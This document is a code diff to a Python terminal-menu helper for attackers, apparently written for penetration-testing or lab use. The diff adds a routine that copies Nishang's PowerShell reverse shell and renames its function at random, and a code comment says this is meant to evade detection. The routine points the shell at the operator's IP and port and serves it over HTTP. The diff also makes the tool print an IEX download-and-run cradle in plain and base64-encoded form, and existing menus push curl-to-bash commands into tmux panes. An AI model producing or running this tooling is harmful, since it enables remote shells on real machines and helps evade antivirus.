@@ -2,6 +2,11 @@
 
 from simple_term_menu import TerminalMenu
 import os
+import string
+import random
+import base64
+
+NISHANG_SCRIPT = '/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1'
 
 def get_ip(iface):
     cmd = f"ip a s {iface} | grep -Eo \'[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\' | head -n 1"
@@ -92,6 +97,51 @@ def get_temp_python_file(pattern):
     url = f"http://{ip}:{port}/{filename}"
     return url
 
+def select_python_http():
+    cmd = "ps -ef | grep http.server | grep -v grep"
+    lines = os.popen(cmd).readlines()
+    pids = []
+    ports = []
+    options = []
+    for l in lines:
+        items = list(map(lambda x: x.strip('\n'), filter(lambda x: len(x) > 0, l.split(' '))))
+        port = items[-1]
+        pid = items[1]
+        pids.append(pid)
+        ports.append(port)
+        options.append(f"PID {pid} Port {port}")
+    if len(options) == 1:
+        return pids[0], ports[0]
+    elif len(options) == 0:
+        raise Exception('No Python HTTP servers')
+    else:
+        print("Select Python HTTP Server")
+        index = TerminalMenu(options).show()
+        return pids[index], ports[index]
+
+def copy_nishang(ip, port, directory):
+    lines = open(NISHANG_SCRIPT, 'r').readlines()
+    randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
+    functionName = 'Invoke-' + randomName
+    filename = f"{randomName}.ps1"
+    output = ''
+    comment = False
+    for l in lines:
+        if l.startswith('<#'): # strip comments
+            comment = True
+        if l.startswith('function '):
+            output += f"function {functionName}\n" # rename the invoke function so it's not as easy to detect
+        elif not comment:
+            output += l
+        if l.startswith('#>'):
+            comment = False
+    output += '\n' + f"{functionName} -Reverse -IPAddress {ip} -Port {port}"
+
+    f = open(directory + filename, 'w')
+    f.write(output)
+    f.close
+    return filename
+
 def is_python_http_running():
     cmd = "ps -ef | grep http.server | grep -v grep"
     output = os.popen(cmd).read()
@@ -101,6 +151,7 @@ def linux_menu():
     options = ["Stabilize shell", "wget a file", "curl file and pipe to bash"]
     terminal_menu = TerminalMenu(options)
     index = terminal_menu.show()
+    print(options[index])
     if index == 0:
         stabilize_shell()
     elif index == 1 or index == 2:
@@ -118,13 +169,30 @@ def choose_apache_or_python():
     index = TerminalMenu(["Apache", "Python HTTP"]).show()
     return index == 0
 
-def windows_menu():
-    useApache = True
+def nishang_shell_menu():
     if is_python_http_running():
-        useApache = choose_apache_or_python()
-    options = ["wget outfile", "IEX download and run script"]
+        rev_shell_port = input("Enter port for nishang reverse shell to connect: ")
+        pid, port = select_python_http()
+        print(f"Server {pid} on port {port}")
+        directory = f"/proc/{pid}/cwd/"
+        ip = get_interface_ip()
+        filename = copy_nishang(ip, rev_shell_port, directory)
+        url = f"http://{ip}:{port}/{filename}"
+        print(f"Nishang URL: {url}")
+        pscommand = f"IEX(New-Object Net.WebClient).downloadString('{url}')"
+        print(f"Commnad: powershell -c \"{pscommand}\"")
+        utf16 = pscommand.encode('utf-16le')
+        b = base64.b64encode(utf16).decode('latin1')
+        print(f"Encoded: powershell -Enc {b}")
+        input('Press any key to continue')
+
+def windows_menu():
+    options = ["wget outfile", "IEX download and run script", "Prepare nishang reverse shell"]
     index = TerminalMenu(options).show()
+    print(options[index])
     if index == 0 or index == 1:
+        useApache = True
+        if is_python_http_running(): useApache = choose_apache_or_python()
         ip = get_interface_ip()
         pane = select_pane()
         if index == 0:
@@ -143,12 +211,15 @@ def windows_menu():
                 url = get_temp_python_file('.ps1')
             cmd = f"tmux send-keys -t {pane} 'IEX(New-Object Net.WebClient).downloadString(' \\' '{url}' \\' ')'"
         os.system(cmd)
+    elif index == 2:
+        nishang_shell_menu()
 
 def main():
     os.system("pwd")
     options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "Start apache"]
     terminal_menu = TerminalMenu(options)
     index = terminal_menu.show()
+    print(options[index])
     if index == 0:
         copy_to_menu(get_interface_ip())
     elif index == 1:
